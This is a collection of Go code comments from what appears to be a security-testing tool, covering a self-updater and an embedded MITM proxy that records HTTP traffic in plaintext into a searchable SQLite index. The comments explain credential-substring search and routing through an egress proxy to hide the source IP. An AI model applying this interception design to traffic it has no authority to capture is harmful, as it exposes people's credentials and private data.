// This is the only update path that overwrites the executable and the final gate: smoke tests catch
// corrupt downloads, wrong architectures, and missing dynamic libraries. If an unrunnable binary passes,
// the supervisor endlessly relaunches it while Go code never runs, so automatic rollback cannot execute.
// Swap succeeded. Keep the marker for the next startup, running the new version, to confirm stability.
// confirmOrRollback handles startup after a swap: count attempts and restore the old version above the limit.
// The counter increments only after Go code starts, covering executable binaries that crash during initialization
// (incompatible configuration, occupied ports, failed DB migrations). Pre-swap smoke tests catch binaries that
// cannot execute at all; both checks are needed for complete coverage.
// If even rollback fails, stop requesting restarts to avoid an infinite loop. Clear the marker
// and start in the current state; if startup fails, users can at least see the reason in logs.
// Settle confirms the new version is stable and removes the update marker.
// main calls it after a delay once HTTP is listening. The process must survive that interval; otherwise retain the marker,
// count attempts at subsequent startups, and eventually roll back.
// Not an upgrade startup; nothing to do
// SettleDelay is the runtime required to consider the new version alive.
// verifyStaged checks the staged binary: compare SHA256, then actually launch it once.
// smokeTest launches the new binary with -h to confirm it can execute on this system.
// This catches truncated downloads, wrong architectures (exec format error), missing dependencies, and similar failures.
// swap replaces the current binary with the staged new version.
// Unix and Windows both permit renaming a running executable (Windows prohibits deletion and
// overwriting, not renaming), so no platform branch or prior self-shutdown is required.
// Windows rename cannot replace an existing destination; remove the previous update's .old first.
// If swapping fails after moving the current version aside, restore it unchanged or the next startup has no executable.
// rollback restores the old version backed up by swap.
// Move the unstartable new version to .failed for diagnosis rather than deleting it.

Comments.Text: // bulkRecord fills the index with inline bodies — the ones that actually make
// index.sqlite grow. Binary content type keeps them out of the full-text index so
// the test stays fast; the FTS side is covered by TestReclaimMergesFTSTombstones.
// TestDeleteReclaimsIndexSpace is the regression: deleting traffic used to leave
// index.sqlite at its high-water mark forever, because SQLite only chains freed
// pages onto its freelist and nothing ever returned them to the filesystem.
// 30 × 200KB stays under maxInlineBody, so every body lands in the database
// itself rather than the blob store — that is where the growth was invisible.
// Reclamation runs in background chunks.
// A handful of pages incremental_vacuum could not move to the end of the file
// is a normal residual; the ~1500 that the deletion freed must be gone.
// TestReclaimMergesFTSTombstones covers the second half of the leak: ex_fts is a
// contentless_delete index, so a DELETE only writes tombstones. Without a merge
// the index keeps growing on every deletion — deleting traffic made it bigger.
// Deleted in batches, which is what leaves tombstones spread over many
// segments rather than emptying the index in one shot.
// A fully merged, empty contentless index keeps only its structure rows.
// TestReclaimOnLegacyIndexIsHarmless covers installs created before
// auto_vacuum=incremental became the default: incremental_vacuum is a silent
// no-op there, so reclamation must report the situation and finish rather than
// spin or fail. Only a full compaction can convert such a file.
// Create the tables first, with auto_vacuum left at its default 0 — exactly the
// shape Open used to leave behind.
// Must converge, not get stuck within the budget.
// The freelist stays populated: that is the whole reason a compaction entry
// point is needed for pre-existing databases.
// TestDeleteAllPurgesAndCompacts covers the page's clear-everything action: it
// must leave nothing behind — including host directories the index no longer
// knows about — and it must hand the index space back, since an emptied index is
// the one moment a full rewrite is cheap.
// A text body so the full-text index has real content, and a spilled one so a
// blob exists to collect.
// An orphaned legacy directory: no index row points at it, so only a
// clear-everything should take it.
// Recording must keep working against the freshly rewritten file.
// TestDeleteAllConvertsLegacyIndex is why the purge compacts rather than just
// deleting: auto_vacuum cannot be switched on after the fact except through a
// VACUUM, and an emptied index is the cheapest place to pay for one. After this,
// ordinary deletions reclaim space on their own.
// The converted database now reclaims on an ordinary host deletion.

Comments.Text: // Package traffic implements the request-recording subsystem (docs §10): an
// embedded go-mitmproxy proxy whose addon writes every target HTTP exchange into
// a human-browsable file tree, with a sidecar SQLite index for paged queries.
// Full capture, plaintext (no redaction), target HTTP only.
// ftsSchema is applied separately from indexSchema: a driver build without FTS5
// must degrade to "no full-text search" rather than take the whole recorder down.
// trigram (not the default unicode61) is required for two reasons this subsystem
// depends on: it matches arbitrary substrings — "ssw0r" finds "P@ssw0rd" — and it
// handles CJK, which unicode61 does not tokenize. Contentless (content=”) keeps
// only the index, since the text itself lives in exchange_bodies; contentless_delete
// lets rows be deleted without replaying the original text back in.
// maxInlineBody is the cutoff between a body stored inline (SQLite column) and
// one spilled to the content-addressed blob store.
// blobPreview is how much of a spilled body stays inline so readers can tell
// what it is (JSON shape, SQL dump header, ZIP magic) without fetching it.
// maxIndexBody caps a single body's contribution to the full-text index. Text
// is indexed in full below this; binary never reaches the index at all.
// minTrigram is the shortest term the trigram tokenizer can match; shorter
// queries fall back to metadata LIKE.
// maxBlobRead caps one traffic_blob read so paging through a large body never
// floods the agent's context.
// autoVacuumIncremental is SQLite's numeric value for auto_vacuum=incremental.
// reclaimChunkPages bounds how much index space one locked step returns to the
// filesystem (pages are 4KiB, so ~32MB). Reclamation holds the write lock, and
// record() runs before go-mitmproxy replies to the client, so an unbounded
// pass would stall the very requests being recorded.
// reclaimMergePages bounds the full-text merge done alongside each chunk.
// Deleting from a contentless_delete index only writes tombstones; merging is
// what discards them, and left undone the index grows on every deletion.
// reclaimMergeSteps bounds how many merges one reclamation performs. fts5
// offers no way to ask whether an index has settled — its special INSERT
// registers a row change of its own, so change counting cannot tell a real
// merge from a no-op — so the budget is simply spent down, and whatever is
// left over falls to the next deletion.
// reclaimMaxSteps backstops the loop. Both merging and incremental_vacuum are
// documented to stop making progress eventually, but a reclamation that cannot
// converge must give up rather than spin holding the write lock.
// reclaimBudget caps one background reclamation. Deleting a busy host can free
// gigabytes, and the next deletion resumes wherever this one stopped.
// TrafficSearchDescription is persisted into the tool catalog for new and
// upgraded installations. Keep it in the traffic package so the runtime tool
// and the catalog migration cannot drift apart.
// Traffic runs the recording proxy and owns the file tree + index.
// serializes record() vs DeleteHost (incl. blob GC)
// fts reports whether the full-text index is available. False on a driver
// build without FTS5: recording and metadata search still work, body search
// degrades to unsupported rather than erroring.
// reaping tracks background reclamation of legacy trees and index space, so
// shutdown and tests can wait for it instead of racing it.
// incrementalVacuum reports whether the index can return freed pages to the
// filesystem on its own. False on a database created before this was the
// default: PRAGMA incremental_vacuum is a silent no-op there, so deletions
// reclaim nothing until an explicit full compaction converts the file.
// reclaiming keeps a single background reclamation in flight. Concurrent ones
// would only contend for wmu, never finish sooner.
// closed is shut by Close so a reclamation abandons its remaining budget
// instead of holding shutdown open for minutes. Nil on the zero value, which
// stopping() treats as "not closing".
// pass is the set of hosts whose MITM interception failed for a proxy/protocol
// reason; connections to them are tunneled transparently (fail-open) so the
// request still reaches the target — unrecorded — instead of being killed.
// hostname(string) -> struct{}
// upstream is the global egress proxy every captured request is forwarded
// through (nil = dial targets directly). Both the intercepted and the
// transparent-passthrough paths honor it (go-mitmproxy's getUpstreamConn),
// so no host escapes it. Hot-swappable at runtime via SetUpstreamProxy.
// Open initializes the traffic tree, blob store and SQLite index under dir.
// busy_timeout is a per-connection setting, so it belongs in the DSN rather
// than in a one-off Exec: the pool opens connections on demand, and an Exec
// only configures whichever one happened to serve it — leaving every other
// connection to fail instantly the moment a writer holds the database.
// The driver splits the DSN at the first '?', so a data directory containing
// one would silently name a different file; that path falls back to a bare
// DSN, where initIndex still applies the pragmas to its own connection.
// Upstream selection. By default (no global egress proxy set) targets are
// dialed DIRECTLY: go-mitmproxy's own default upstream uses
// http.ProxyFromEnvironment, so an HTTP_PROXY/HTTPS_PROXY in the environment
// (a VPN/system proxy) would make it forward target requests through that
// external proxy — which can't reach the target → 502. Returning nil forces
// a direct dial. When a global egress proxy IS configured (SetUpstreamProxy),
// every captured request — intercepted AND transparently tunneled — is
// forwarded through it instead, so no host leaks the real source IP.
// Fail-open: MITM every host by default, EXCEPT ones a prior request proved we
// can't intercept without breaking (see maybePassthrough). Those are tunneled
// transparently so the request still reaches the target instead of being killed.
// initIndex applies the schema on a single pinned connection. Pinning is what
// makes auto_vacuum reliable: it can only be set while the database still holds
// no tables, and only the VACUUM that follows writes it into the file header —
// two steps a pooled *sql.DB is free to route to different connections, which
// would silently drop the setting.
// auto_vacuum=incremental is what lets a deletion hand freed pages back to the
// filesystem. Without it SQLite merely chains them onto its freelist, so the
// index file never shrinks no matter how much traffic is deleted — and since
// every body below maxInlineBody lives in that file, plus a trigram index
// roughly twice the size of the text it covers, a capture-heavy install ends up
// holding gigabytes for traffic it no longer has. On a database that already has
// tables the pragma is a documented no-op, so installs created before this keep
// auto_vacuum=0 until a full compaction converts the file; incrementalVacuum
// records that so reclaim can say so instead of pretending to reclaim.
// Re-applied rather than left to the DSN so the bare-DSN fallback in Open is
// still correct: journal_mode persists in the file header, which is what every
// later connection reads.
// hostOnly strips an optional :port, so passthrough keys match whether the host
// arrives as "example.com:443" (CONNECT) or "example.com" (request URL).
// ProxyAddr returns the address workers should set as HTTP(S)_PROXY. A bare
// ":port" means "bind all interfaces" (legacy default), so map it to loopback.
// SetUpstreamProxy points every captured request at a global egress proxy
// (http/https/socks5, optional user:pass in the URL). An empty raw string clears
// it, restoring direct dialing. The change is atomic and takes effect on the next
// connection — no restart, no proxy rebuild. go-mitmproxy dials all three schemes
// itself, so socks5 works uniformly here regardless of the target tool.
// ValidateProxyURL parses and checks a proxy URL (http/https/socks5, optional
// user:pass), returning the parsed URL. Exposed so callers can validate a global
// proxy before persisting it even when the traffic proxy itself is disabled.
// CACertPath returns the PEM CA cert clients must trust to verify HTTPS through
// the MITM proxy (go-mitmproxy writes it here on first start).
// Start runs the proxy (blocking); run in a goroutine.
// Close waits for background tree reclamation to finish before closing the
// index, so shutdown never leaves a goroutine unlinking files out from under a
// removed data directory. Index-space reclamation is signalled to stop first:
// it holds a whole minutes-long budget, and finishing it is never worth delaying
// shutdown for — the next deletion resumes it.
// stopping reports whether Close has been called. A nil channel (the zero value)
// is never ready, so this reads as "not closing" without a separate guard.
// sink is the go-mitmproxy addon that records completed exchanges.
// RequestError fires when a request through an established MITM tunnel fails. If
// the failure looks proxy/protocol-caused (h2 quirks, HEAD-with-body, protocol
// errors) — not a plain target-unreachable error — we flag the host for
// transparent passthrough so future requests to it succeed instead of dying.
// maybePassthrough marks a host to be tunneled transparently on the next
// connection, but only for errors the proxy itself caused — a target that is
// simply down/filtered would fail without us too, and must stay MITM'd+recorded.
// proxyCausedErr reports whether err indicates the interception layer (not the
// target) is at fault — HTTP/2 handling, HEAD-with-body, or a protocol violation.
// record persists one exchange entirely in SQLite: metadata, bodies and the
// full-text index. Nothing is written to a per-request directory — only bodies
// above maxInlineBody spill to the content-addressed blob store.
// The write lock covers blob + index writes, so DeleteHost (and its blob GC)
// can run under the same lock without racing a concurrent record.
// Bodies are spilled before the transaction opens: blob writes are filesystem
// work and must not sit inside the SQLite write lock.
//nolint:errcheck // no-op once committed
// path stays empty for db-resident exchanges; a non-empty path marks a legacy
// row whose bodies still live in the old on-disk tree (see Get).
// The index is fed from memory, so a body that spilled to _blobs is still
// fully searchable even though only its preview is stored inline.
// storedBody is one body after the inline/spill decision: inline is what goes in
// the SQLite column (the whole body, or a preview when spilled), hash names the
// blob when it spilled, and index is the text handed to FTS (empty for binary).
// spill decides where one body lives. Small bodies stay inline. Large ones are
// written to the content-addressed store and keep a readable preview inline so a
// reader can identify them without fetching the blob. Either way, text bodies
// are handed to the full-text index in full (up to maxIndexBody) — indexing is
// independent of where the bytes end up.
// One bucket level (256 buckets) is enough to keep any single directory small;
// the store only ever holds bodies above maxInlineBody, deduplicated by hash.
// binaryTypes are content-type prefixes whose bodies are never worth indexing or
// previewing as text. Anything not listed is treated as text (with a NUL-byte
// check as backstop), so unusual-but-searchable types like application/sql or a
// bare text/* are not silently dropped from the index.
// Backstop for mislabeled or absent content types: real text does not carry
// NUL bytes, so a NUL in the head of the body means binary regardless.
// binaryTag describes a spilled binary body in one line, including the leading
// magic bytes so a reader can recognize the format without downloading it.
// truncateUTF8 cuts b to at most n bytes without splitting a multi-byte rune,
// so a preview never ends in half a CJK character.
// A rune is at most 4 bytes, so backing off 3 bytes always finds the boundary
// (unless the input was already invalid UTF-8, in which case we keep the cut).
// requestHeaderLines restores the HTTP Host header, which net/http stores on
// Request.Host rather than in Header. Keeping it in request.http makes the raw
// capture complete and directly replayable.
// blobPath locates a stored blob. Current writes use one bucket level; blobs
// written before that change used two, so both layouts are probed rather than
// migrated.
// Validated as pure hex before touching the filesystem, so a crafted hash can
// never traverse out of the blob directory.
// Blob opens a spilled body for streaming; the caller must close the file.
// Streaming matters here: the driver exposes no incremental BLOB API, so keeping
// large bodies on disk is what lets them be served without loading them whole.
// BlobRange reads at most length bytes of a blob from offset, and reports the
// blob's total size. Used by the agent tool to page through a large body without
// pulling all of it into the model's context.
// ExchangeMeta is one row of the index (returned by Search).
// Search returns paged exchange metadata (never bodies).
// ftsFilter builds the SQL condition restricting rows to those whose indexed
// text matches term. ok is false when full-text search cannot serve the term —
// no FTS index on this build, or fewer than three characters, which the trigram
// tokenizer cannot match — leaving callers to fall back to metadata matching.
// ftsQuote wraps a term as an FTS5 string literal so that punctuation and query
// operators inside it (quotes, AND/OR/NEAR, *, ^) are matched literally instead
// of being parsed as query syntax.
// PageQuery bundles the optional filters and sort order for Page. Every filter
// is combined with AND; an empty string skips that filter, and RespMin/RespMax
// of -1 skip the response-size bounds. An empty Sort/Order defaults to
// newest-first by timestamp.
// host substring
// exact method (case-insensitive)
// broad search box: metadata columns OR captured text
// content box: captured request/response text only (full-text)
// url_template substring — the vulnerability's path
// exact code ("404") or class bucket ("4xx")
// minimum resp_len, or -1 when unset
// maximum resp_len, or -1 when unset
// ts | status | resp_len (default ts)
// asc | desc (default desc)
// sortColumns whitelists the columns Page may order by, so the caller-supplied
// Sort can never reach the SQL as anything but one of these fixed names.
// statusFilter turns a status token into a SQL condition: an exact code ("404")
// matches that status, an "Nxx" class ("4xx") matches the whole hundreds band.
// ok is false for an empty or unrecognized token.
// Page returns one page of exchange metadata for the traffic list, filtered by
// the criteria in f (all optional, combined with AND) and ordered by the
// requested column. Query is the broad search box (metadata columns OR, when the
// term is long enough for the trigram index, captured request/response text);
// Body narrows to exchanges whose captured text matches, via that same index.
// Also returns the total number of rows matching the filter (for the UI's
// pagination). Bodies are never included in the rows.
// Metadata match OR full-text match: one search box, widest recall. Terms
// too short for trigram silently fall back to metadata only.
// Body is the dedicated content box: it only searches captured request/response
// text, so it goes straight to the full-text index with no metadata fallback. A
